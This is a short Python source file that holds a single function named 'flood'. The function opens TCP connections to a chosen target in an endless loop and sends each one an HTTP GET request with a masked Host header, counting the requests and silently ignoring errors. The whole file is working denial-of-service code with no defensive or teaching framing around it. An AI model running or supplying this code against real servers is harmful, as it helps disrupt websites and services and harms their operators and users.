# Flood function

import socket

def flood(source, target, port, masked):

    try:
        
        while True:
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('utf-8'), (target, port))
            s.sendto(("Host: " + masked + "\n\r\r\n").encode('utf-8'), (target, port))
            
            global number_of_requests
            number_of_requests += 1

            if number_of_requests % 128 == 0:
                
                print(f'{number_of_requests} requests', end='\r')
            
            s.close()

    except:
        
        pass